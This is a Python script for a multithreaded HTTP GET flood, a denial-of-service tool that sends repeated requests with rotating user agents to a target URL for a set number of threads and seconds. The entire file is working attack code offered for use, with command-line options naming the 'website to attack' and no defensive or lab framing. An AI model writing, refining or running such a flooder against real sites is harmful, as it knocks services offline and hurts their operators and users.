"""This module provides the flood function for an HTTP GET request DoS attack."""

import argparse
import json
import random
from threading import Thread
from typing import Dict, List, Tuple, Union
from time import sleep, time
import socket
from humanfriendly.terminal.spinners import Spinner # Need to pip install humanfriendly

import requests
from requests.exceptions import Timeout
import sys

with open("/usr/local/share/scripts/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]




headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}


def flood(target: str) -> None:
    """Start an HTTP GET request flood.

    Args:
        - target - Target's URL

    Returns:
        None
    """
    global headers

    headers["User-agent"] = random.choice(user_agents)

    try:
        response = requests.get(target, headers=headers, timeout=4)
    except (Timeout, OSError):
        return
    else:
        status = (
            f"{[response.status_code == 200]}Status: [{response.status_code}]"
        )
        payload_size = f"Requested Data Size: {round(len(response.content)/1024, 2):>6} KB"
        print(f"{status} --> {payload_size}")



def main(args) -> None:
    """Run main application."""
    try:
        target = args.target # Need to argparse target
        threads = args.threads # Need to argparse threads
        time = args.time # Need to argparse time

        attack = AttackMethod(
            duration=time,
            threads=threads,
            target=target)

        attack.start()
    except Exception as e:
        print(e)
        

class AttackMethod:
    """Control the attack's inner operations."""

    def __init__(
        self,
        duration: int,
        threads: int,
        target: str,
    ):
        """Initialize the attack object.

        Args:
            - duration - The duration of the attack, in seconds
            - threads - The number of threads that will attack the target
            - target - The target's URL
        """
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.threads: List[Thread]
        self.threads = []
        self.is_running = False


    def __run_timer(self) -> None:
        """Verify the execution time every second."""
        __stop_time = time() + self.duration
        while time() < __stop_time:
            sleep(1)
        self.is_running = False

    def __run_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """Start the flooder."""
        while self.is_running:
            flood(self.target)

    def __start_threads(self) -> None:
        """Start the threads."""
        with Spinner(
            label=f"Starting {self.threads_count} Thread(s)",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                self.thread = thread
                self.thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

    def __run_threads(self) -> None:
        """Initialize the threads and start them."""
        self.threads = [
            Thread(target=self.__run_flood) for _ in range(self.threads_count)
        ]

        self.__start_threads()

        # Timer starts counting after all threads were started.
        Thread(target=self.__run_timer).start()

        # Close all threads after the attack is completed.
        for thread in self.threads:
            thread.join()

        print(f"\n\n[!] Attack Completed!\n\n")

    def start(self) -> None:
        """Start the DoS attack itself."""
        duration = self.duration

        print(
            f"\n[!] Attacking {self.target} "
            f"using Flood method \n\n"
            f"[!] The attack will stop after {duration}\n"
        )

        self.is_running = True

        try:
            self.__run_threads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n\n[!] Ctrl+C detected. Stopping Attack..."
            )

            for thread in self.threads:
                if thread.is_alive():
                    thread.join()

            print(f"\n[!] Attack Interrupted!\n\n")
            sys.exit(1)

parser = argparse.ArgumentParser()
parser.add_argument("-n", "--threads", type=int,
                    help="number of threads")
parser.add_argument("-t", "--time", type=int,
                    help="seconds to run attack")
parser.add_argument("-s", "--target", type=str,
                    help="website to attack")

args = parser.parse_args()
main(args)